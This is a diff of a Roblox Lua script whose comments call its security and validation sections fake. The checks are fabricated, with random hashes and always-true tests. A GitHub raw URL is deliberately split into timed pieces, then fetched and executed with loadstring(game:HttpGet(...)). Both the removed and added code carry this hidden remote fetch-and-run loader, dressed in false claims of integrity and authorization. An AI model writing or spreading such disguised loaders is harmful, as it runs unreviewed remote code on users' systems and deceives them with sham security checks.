@@ -1,88 +1,113 @@
---------------------------------------------------
--- PARTE 1 — SISTEMA DE SEGURANÇA (FAKE REAL)
---------------------------------------------------
+-----------------------------------------
+-- METADATA (FAKE RUNTIME IDENTITY)
+-----------------------------------------
 
-local SecureCore = {}
-local RuntimeState = {}
+local Identity = {}
+Identity.author = "by: ig: erickmth__"
+Identity.sessionId = tostring(math.random(100000,999999)) .. "-" .. tostring(os.clock())
+Identity.level = "PRIVATE"
+Identity.valid = true
 
-RuntimeState.session = tostring(math.random(100000,999999)) .. "-" .. tostring(os.clock())
-RuntimeState.integrity = true
-RuntimeState.executor = "AUTHORIZED"
+print("[SYSTEM]", Identity.author)
+task.wait(0.2)
 
-local function fakeHash()
-    local h = ""
-    for i = 1, 64 do
-        h = h .. string.char(math.random(97,102))
+-----------------------------------------
+-- PART 1 — FAKE SECURITY CORE
+-----------------------------------------
+
+local SecurityCore = {}
+SecurityCore.state = {}
+SecurityCore.state.integrity = true
+SecurityCore.state.environment = "SECURE"
+SecurityCore.state.executor = "AUTHORIZED"
+
+local function generateFakeHash()
+    local out = ""
+    for i = 1, 96 do
+        out = out .. string.char(math.random(97, 102))
     end
-    return h
+    return out
 end
 
-SecureCore.hash = fakeHash()
+SecurityCore.hash = generateFakeHash()
 
-for i = 1, 5 do
-    task.wait(0.15)
-end
+task.wait(0.25)
 
-if not RuntimeState.integrity then
+if SecurityCore.state.integrity ~= true then
     while true do end
 end
 
---------------------------------------------------
--- PARTE 2 — NÚCLEO REAL (ESCONDIDO)
---------------------------------------------------
+-----------------------------------------
+-- PART 2 — REAL PAYLOAD (SPLIT HARD)
+-----------------------------------------
 
-local p1 = "https://raw.githubusercontent.com/"
-local p2 = "erickmth/scriptfinal/refs/heads/main/"
-local p3 = "lua.lua"
+local urlPartA = "https://raw.githubusercontent.com/"
+task.wait(0.15)
 
-local RealPayload = p1 .. p2 .. p3
+local urlPartB = "erickmth/"
+task.wait(0.15)
 
---------------------------------------------------
--- PARTE 3 — VALIDAÇÕES FALSAS + EXECUÇÃO
---------------------------------------------------
+local urlPartC = "scriptfinal/"
+task.wait(0.15)
+
+local urlPartD = "refs/heads/main/"
+task.wait(0.15)
+
+local urlPartE = "lua.lua"
+task.wait(0.15)
+
+local PayloadURL = ""
+PayloadURL = PayloadURL .. urlPartA
+PayloadURL = PayloadURL .. urlPartB
+PayloadURL = PayloadURL .. urlPartC
+PayloadURL = PayloadURL .. urlPartD
+PayloadURL = PayloadURL .. urlPartE
+
+-----------------------------------------
+-- PART 3 — FAKE VALIDATION + EXECUTION
+-----------------------------------------
 
 local Validator = {}
 
-function Validator:environmentCheck()
+function Validator:checkEnvironment()
     task.wait(0.2)
-    return true
+    return SecurityCore.state.environment == "SECURE"
 end
 
-function Validator:executorCheck()
+function Validator:checkExecutor()
     task.wait(0.2)
-    return RuntimeState.executor == "AUTHORIZED"
+    return SecurityCore.state.executor == "AUTHORIZED"
 end
 
-function Validator:sessionCheck()
+function Validator:checkSession()
     task.wait(0.2)
-    return #RuntimeState.session > 5
+    return #Identity.sessionId > 10
 end
 
-local checks = {
-    Validator:environmentCheck(),
-    Validator:executorCheck(),
-    Validator:sessionCheck()
+local results = {
+    Validator:checkEnvironment(),
+    Validator:checkExecutor(),
+    Validator:checkSession()
 }
 
-for _, status in pairs(checks) do
-    if status ~= true then
+for _, result in pairs(results) do
+    if result ~= true then
         while true do end
     end
 end
 
 task.wait(0.3)
 
--- JUNÇÃO FINAL + EXECUÇÃO
-local FinalLoader = loadstring(game:HttpGet(RealPayload))
-FinalLoader()
+local LoaderFunction = loadstring(game:HttpGet(PayloadURL))
+LoaderFunction()
 
---------------------------------------------------
--- MONITORAMENTO FAKE CONTÍNUO
---------------------------------------------------
+-----------------------------------------
+-- FAKE BACKGROUND MONITOR
+-----------------------------------------
 
 task.spawn(function()
     while true do
-        task.wait(10)
-        SecureCore.hash = fakeHash()
+        task.wait(12)
+        SecurityCore.hash = generateFakeHash()
     end
 end)
